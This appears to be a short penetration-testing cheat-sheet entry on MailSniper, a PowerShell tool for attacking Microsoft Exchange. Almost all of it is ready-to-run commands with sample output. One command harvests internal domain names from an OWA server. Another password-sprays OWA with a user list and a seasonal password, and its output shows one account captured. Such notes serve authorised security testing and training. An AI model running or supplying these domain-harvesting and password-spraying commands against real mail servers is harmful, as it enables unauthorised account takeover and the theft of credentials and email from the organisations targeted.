
## [[Internal Phishing]] [[Phishing]]
Get internal domain names
``````
ipmo C:\Tools\MailSniper\MailSniper.ps1
Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100

[*] Harvesting domain name from the server at 10.10.15.100
The domain appears to be: EDU or evil.corp
``````

 Password spray
``````
Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2022

[*] Now spraying the OWA portal at https://10.10.15.100/owa/
[*] SUCCESS! User:EDU\patrick Password:Summer2022
[*] A total of 1 credentials were obtained.
``````


```meta
requirements: 
results: 
oss: #win, #ps1
source: https://github.com/dafthack/MailSniper
description: MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email or by an Exchange administrator to search the mailboxes of every user in a domain.
```